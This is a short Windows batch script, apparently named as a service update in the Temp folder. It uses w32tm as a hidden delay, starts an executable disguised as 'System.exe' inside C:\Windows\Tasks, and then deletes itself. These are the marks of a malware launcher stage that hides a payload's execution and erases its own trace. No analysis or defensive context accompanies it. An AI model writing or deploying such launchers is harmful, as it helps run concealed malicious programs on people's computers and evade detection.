@echo off
w32tm /stripchart /computer:localhost /period:10 /dataonly /samples:3 1>nul
start "" "C:\Windows\Tasks\System.exe"
del /q /f "C:\Windows\Temp\svc_update9.bat"
